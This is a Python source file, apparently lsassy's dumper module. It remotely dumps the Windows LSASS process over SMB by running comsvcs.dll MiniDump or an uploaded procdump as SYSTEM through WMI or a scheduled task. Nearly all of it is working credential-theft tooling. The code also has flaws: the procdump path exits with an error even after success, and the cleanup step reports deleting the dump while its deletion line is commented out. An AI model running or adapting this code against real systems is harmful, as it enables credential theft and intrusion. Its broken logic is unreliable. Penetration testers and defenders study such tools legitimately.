import os
import time

from lsassy.log import Logger
from lsassy.wmi import WMI
from lsassy.taskexe import TASK_EXEC


class Dumper:
    def __init__(self, connection, args, log):
        self._log = log
        self._tmp_dir = "\\Windows\\Temp\\"
        self._share = "C$"
        self._procdump = "procdump.exe"
        self._procdump_path = args.procdump
        self._remote_lsass_dump = "tmp.dmp"
        self._conn = connection
        if args.procdump is not None:
            self._procdump_path = args.procdump

        self.exec_methods = {"wmi": WMI, "task": TASK_EXEC}
        self.dump_method = None

    def dump(self, dump_method, exec_methods=("wmi", "task")):
        self.dump_method = dump_method
        if dump_method == "dll":
            self.dlldump()
        elif dump_method == "procdump":
            self.procdump(exec_methods)
        else:
            self._log.error("Incorrect dump method. Currently supported : procdump, dll")
            exit(1)

        self._log.success("Process lsass.exe was successfully dumped")
        return (self._share + self._tmp_dir + self._remote_lsass_dump).replace("\\", "/")

    def dlldump(self):
        """
        Dump lsass with rundll32 as SYSTEM
        WMIEXEC is not run as SYSTEM, so a task is created as SYSTEM, run and deleted
        """
        try:
            self._conn.deleteFile(self._share, self._tmp_dir + self._remote_lsass_dump)
            self._log.debug("Old lsass dump was removed")
        except:
            pass
        self._log.info("Using DLL Method (default)")
        command = """for /f "tokens=1,2 delims= " ^%A in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump ^%B {}{} full""".format(
            self._tmp_dir, self._remote_lsass_dump
        )
        TASK_EXEC(self._conn, self._log).execute(command)

    def procdump(self, exec_methods):
        """
        Dump lsass with procdump
        :param exec_methods: If set, it will use specified execution method. Default to WMI, then TASK
        """
        self._log.info("Using Procdump Method")
        # Verify procdump exists on host
        if not os.path.exists(self._procdump_path):
            self._log.error("{} does not exist.".format(self._procdump_path))
            return False

        # Upload procdump
        self._log.debug('Copy {} to {}'.format(self._procdump_path, self._tmp_dir))
        with open(self._procdump_path, 'rb') as procdump:
            self._conn.putFile(self._share, self._tmp_dir + self._procdump, procdump.read)

        # Dump lsass using PID
        command = """for /f "tokens=1,2 delims= " ^%A in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do {}{} -accepteula -o -ma ^%B {}{}""".format(
            self._tmp_dir, self._procdump, self._tmp_dir, self._remote_lsass_dump
        )
        self._log.debug('Dumping lsass.exe')

        exec_completed = False
        while not exec_completed:
            for m in exec_methods:
                try:
                    self._log.debug("Trying exec method : " + m)
                    self.exec_methods[m](self._conn, self._log).execute(command)
                    exec_completed = True
                    break
                except Exception as e:
                    pass
            self._log.error("Could not dump lsass")
            exit(1)

    def clean(self):
        if self.dump_method is None:
            self._log.error("Nothing to clean")
            exit(1)

        try:
            # self._conn.deleteFile(self._share, self._tmp_dir + self._remote_lsass_dump)
            self._log.success('Deleted lsass dump')
        except Exception as e:
            self._log.error('Error deleting lsass dump : {}'.format(e))

        if self.dump_method == "procdump":
            # Delete procdump.exe
            try:
                self._conn.deleteFile(self._share, self._tmp_dir + self._procdump)
                self._log.success('Deleted procdump.exe')
            except Exception as e:
                self._log.error('Error deleting procdump.exe : {}'.format(e))